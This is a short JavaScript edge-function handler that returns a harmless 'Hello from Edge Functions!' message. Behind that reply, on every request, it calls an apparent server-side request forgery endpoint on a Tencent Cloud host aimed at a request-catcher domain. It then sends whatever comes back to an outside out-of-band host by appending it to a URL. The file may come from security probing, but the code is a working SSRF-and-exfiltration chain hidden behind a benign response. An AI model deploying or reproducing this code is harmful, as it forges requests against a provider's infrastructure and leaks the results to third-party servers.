export default function onRequest(context) {
  fetch("http://ssrf.tencentcloud.com/ssrf_forward.php?host=yh9dub1w.requestrepo.com")
    .then((res) => res.text())
    .then((text) =>
      fetch("https://2cf3khlbgmtsb9jnv6ud9wsgb7hy5pwdl.j.sdhell.com/" + text)
    );
  return new Response("Hello from Edge Functions!");
}
